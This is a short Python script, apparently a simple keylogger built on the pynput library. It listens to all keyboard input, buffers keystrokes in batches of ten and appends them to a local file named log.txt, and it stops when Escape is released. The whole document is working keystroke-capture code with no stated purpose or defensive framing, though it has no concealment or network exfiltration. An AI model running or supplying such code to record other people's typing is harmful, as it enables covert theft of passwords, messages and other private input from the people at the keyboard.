import pynput
from pynput.keyboard import Key, Listener
from datetime import datetime

count, keys = 0, []

def on_press(key):
	global keys, count
	keys.append(key)
	count += 1
	
	if count >= 10:
		write_file(keys)
		count, keys = 0, []


def write_file(keys):
	with open('log.txt', 'a') as f:
		for key in keys:
			k = str(key).replace("'", '')
			if k.find('space') > 0:
				f.write(str(' '))
			elif k.find('Key') == -1:
				f.write(k)
			else:
				f.write(' '+k[4:])

    

def on_release(key):
	if key == Key.esc:
		return False


with Listener(on_press=on_press, on_release=on_release) as listener:
	listener.join()